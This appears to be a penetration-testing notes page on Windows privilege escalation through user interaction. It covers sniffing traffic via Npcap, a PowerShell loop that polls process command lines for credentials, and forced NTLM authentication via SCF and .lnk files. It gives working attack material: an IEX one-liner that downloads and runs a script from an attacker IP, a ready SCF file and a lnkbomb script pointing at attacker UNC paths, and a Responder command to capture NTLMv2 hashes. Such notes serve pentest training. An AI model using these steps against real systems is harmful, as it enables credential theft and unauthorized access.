---
tags: [privesc, windows, social]
aliases: [User Interaction]
---
# Traffic Capture

If wireshark is installed, unpriviledged users may be able to capture network traffic, restrict Npcap driver access to Administrators only is not enabled by default.

We may land on cleartext credentials transferred over the network.

# Command Lines

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. The following script can process command lines:
```shell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

We can host the script on our attack machine and execute it.
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

# Vulnerable Services

We may also land on a host running a vulnerable application that can be used to elevate privileges through user interaction. 

# SCF on a File Share

Shell Command File (SCF) is used by Windows Explorer to move up and down directories. We can have the icon file location point to a specific UNC path and have the Windows Explorer start an SMB session in the .scf file location. 

An example of such a file is the following. Ensure to name it `@Inventory.scf` to make sure its is seen and executed by Windows Explorer as soon as the user accesses the share. 


```shell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Then we start Responder to capture the NTLMv2 password hash.

```shell
sudo responder -wrf -v -I tun0
```

# .Ink File

After Windows Server 2019 SCFs no longer work. We can achieve the same result with .Ink files. Known as a Lnkbomb. A file would look like

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Related

- [[windows-old]]
- [[05-privilege-escalation/windows/credential-hunting|Credential Hunting]]
- [[citrix-breakout]]
- [[other|Other Privesc]]

